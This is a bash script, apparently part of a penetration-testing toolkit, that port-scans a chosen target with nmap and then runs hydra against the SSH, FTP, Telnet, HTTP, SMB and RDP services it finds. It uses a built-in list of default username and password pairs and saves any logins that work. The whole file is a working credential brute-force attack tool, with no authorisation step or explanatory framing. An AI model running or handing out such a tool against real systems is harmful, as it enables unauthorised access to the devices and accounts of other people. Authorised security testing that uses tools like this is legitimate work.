#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "CREDENTIAL BRUTE-FORCE" "SSH · FTP · HTTP · Telnet · SMB · RDP"

require_tool hydra "apt install hydra"
require_tool nmap  "apt install nmap"

# ── Target & output ───────────────────────────────────────────────────────────
target="$(prompt_target)"
outdir="$(make_outdir)"
outfile="$outdir/brute.txt"
credfile="$outdir/.brute_creds"
: > "$outfile"

trap 'rm -f "$credfile" 2>/dev/null || true' EXIT

printf '  %s[SYS]%s Target  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$target" "${RESET}"
printf '  %s[SYS]%s Output  : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

# ── Credential library ────────────────────────────────────────────────────────
_CREDS_GENERIC=(
  "admin:"          "admin:admin"       "admin:password"    "admin:1234"
  "admin:12345"     "admin:123456"      "admin:admin123"    "admin:pass"
  "admin:test"      "admin:Admin123"    "admin:Welcome1"    "admin:changeme"
  "admin:letmein"   "admin:qwerty"      "admin:P@ssw0rd"    "admin:admin1"
  "root:"           "root:root"         "root:toor"         "root:password"
  "root:1234"       "root:admin"        "root:12345"        "root:changeme"
  "user:user"       "user:password"     "user:1234"
  "guest:"          "guest:guest"       "guest:password"
  "pi:raspberry"    "ubnt:ubnt"         "cisco:cisco"       "support:support"
  "test:test"       "operator:operator" "service:service"   "manager:manager"
  "monitor:monitor" "camera:camera"     "admin:camera"
  "ftpuser:ftpuser" "ftp:ftp"           "anonymous:"        "anonymous:anonymous"
  "supervisor:supervisor" "default:default" "system:system" "admin:system"
  "admin:root"      "root:admin1"
)

_CREDS_SMB=(
  "administrator:"         "administrator:password"
  "administrator:Admin123" "administrator:Welcome1"
  "administrator:P@ssw0rd" "administrator:changeme"
  "admin:admin"            "admin:password"
  "admin:Admin123"         "admin:Welcome1"
  "guest:"                 "user:"
  "user:password"
)

# ── Service discovery ─────────────────────────────────────────────────────────
BRUTE_PORTS="21,22,23,80,443,445,3389,8080,8443"

_port_to_svc() {
  case "$1" in
    21)       echo "ftp"    ;;
    22)       echo "ssh"    ;;
    23)       echo "telnet" ;;
    80|8080)  echo "http"   ;;
    443|8443) echo "https"  ;;
    445)      echo "smb"    ;;
    3389)     echo "rdp"    ;;
    *)        echo "tcp"    ;;
  esac
}

section "SERVICE DISCOVERY"
printf '  %s[*]%s Scanning %s...%s\n' "${CYAN}" "${RESET}" "$target" "${RESET}"

start_spin "nmap scan running"
mapfile -t _scan < <(
  nmap -sT --unprivileged -Pn -n -T4 \
       -p "$BRUTE_PORTS" --open \
       "$target" 2>/dev/null
)
stop_spin

declare -a D_HOST=()
declare -a D_PORT=()
declare -a D_SVC=()

_cur=""
for _line in "${_scan[@]}"; do
  if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
    _cur="${BASH_REMATCH[1]}"
  elif [[ -n "${_cur}" && "$_line" =~ ^([0-9]+)/tcp.*open ]]; then
    D_HOST+=("$_cur")
    D_PORT+=("${BASH_REMATCH[1]}")
    D_SVC+=("$(_port_to_svc "${BASH_REMATCH[1]}")")
  fi
done

if [[ ${#D_HOST[@]} -eq 0 ]]; then
  printf '  %s[!] No brute-forceable services found on %s.%s\n\n' "${RED}" "$target" "${RESET}"
  exit 0
fi

printf '\n  %s[+]%s %d service(s) discovered:\n\n' "${GREEN}" "${RESET}" "${#D_HOST[@]}"
printf '  %s  %-4s  %-15s  %-6s  %-10s%s\n' "${DIM}" "ID" "HOST" "PORT" "SERVICE" "${RESET}"
printf '  %s  ──── ─────────────── ────── ──────────%s\n' "${DIM}" "${RESET}"
for i in "${!D_HOST[@]}"; do
  printf '  %s[%02d]%s  %-15s  %-6s  %s\n' \
    "${CYAN}" "$(( i + 1 ))" "${RESET}" \
    "${D_HOST[$i]}" "${D_PORT[$i]}" "${D_SVC[$i]^^}"
done
printf '\n'

# ── Attack mode ───────────────────────────────────────────────────────────────
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  ATTACK MODE                                     │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'
printf '  %s[01]%s ▶  Quick    all services — top 20 pairs  %s(fast)%s\n'     "${CYAN}"   "${RESET}" "${DIM}" "${RESET}"
printf '  %s[02]%s ▶  Extended all services — top 50 pairs  %s(thorough)%s\n' "${CYAN}"   "${RESET}" "${DIM}" "${RESET}"
printf '  %s[03]%s ▶  Select   pick specific services by ID\n'                 "${CYAN}"   "${RESET}"
printf '\n'
printf '  %s>>%s ' "${CYAN}" "${RESET}"
read -r _mode </dev/tty
echo

case "${_mode:-1}" in
  2) CRED_LIMIT=50 ;;
  *) CRED_LIMIT=20 ;;
esac

declare -a TO_ATTACK=()
if [[ "${_mode:-1}" == "3" ]]; then
  printf '  %s>>%s Service IDs to attack (space-separated, e.g. 1 3 5): ' "${CYAN}" "${RESET}"
  read -r _ids </dev/tty
  for _id in $_ids; do
    if [[ "$_id" =~ ^[0-9]+$ ]] && (( _id >= 1 && _id <= ${#D_HOST[@]} )); then
      TO_ATTACK+=("$(( _id - 1 ))")
    fi
  done
else
  for i in "${!D_HOST[@]}"; do
    TO_ATTACK+=("$i")
  done
fi

if [[ ${#TO_ATTACK[@]} -eq 0 ]]; then
  printf '  %s[!] No valid services selected.%s\n' "${RED}" "${RESET}"
  exit 0
fi

# ── Hydra runner ──────────────────────────────────────────────────────────────
_run_hydra() {
  local host="$1" port="$2" svc="$3" found=0

  printf '\n  %s▶%s  %s  ·  port %s  ·  [%s]\n' \
    "${CYAN}${BOLD}" "${RESET}" "$host" "$port" "${svc^^}"
  printf '  %s──────────────────────────────────────────────%s\n' "${DIM}" "${RESET}"

  if [[ "$svc" == "smb" ]]; then
    printf '%s\n' "${_CREDS_SMB[@]}" > "$credfile"
  else
    printf '%s\n' "${_CREDS_GENERIC[@]:0:$CRED_LIMIT}" > "$credfile"
  fi

  local hsvc
  case "$svc" in
    http)  hsvc="http-get"  ;;
    https) hsvc="https-get" ;;
    *)     hsvc="$svc"      ;;
  esac

  while IFS= read -r _result; do
    if [[ "$_result" == *"login:"* ]]; then
      printf '  %s[✔] FOUND  %s%s\n' "${GREEN}" "$_result" "${RESET}"
      printf '%s\n' "$_result" >> "$outfile"
      found=$(( found + 1 ))
    fi
  done < <(hydra -C "$credfile" -t 4 -q -s "$port" "$host" "$hsvc" 2>/dev/null || true)

  if [[ $found -eq 0 ]]; then
    printf '  %s[~]%s No credentials found%s\n' "${DIM}" "${RESET}" "${RESET}"
  else
    printf '  %s[+]%s %d credential(s) found%s\n' "${GREEN}" "${RESET}" "$found" "${RESET}"
  fi
}

# ── Run attacks ───────────────────────────────────────────────────────────────
section "RUNNING ATTACKS"
printf '  %s[*]%s %d service(s)  ·  up to %d credential pairs each%s\n\n' \
  "${CYAN}" "${RESET}" "${#TO_ATTACK[@]}" "$CRED_LIMIT" "${RESET}"

for idx in "${TO_ATTACK[@]}"; do
  _run_hydra "${D_HOST[$idx]}" "${D_PORT[$idx]}" "${D_SVC[$idx]}"
done

# ── Summary ───────────────────────────────────────────────────────────────────
printf '\n'
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  RESULTS                                         │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'

if [[ -s "$outfile" ]]; then
  total=$(wc -l < "$outfile")
  printf '  %s[✔] %d credential(s) found:%s\n\n' "${GREEN}" "$total" "${RESET}"
  while IFS= read -r _line; do
    printf '  %s  ▶  %s%s\n' "${GREEN}" "$_line" "${RESET}"
  done < "$outfile"
else
  printf '  %s[~]%s No valid credentials found on any target.%s\n' "${DIM}" "${RESET}" "${RESET}"
fi

printf '\n  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
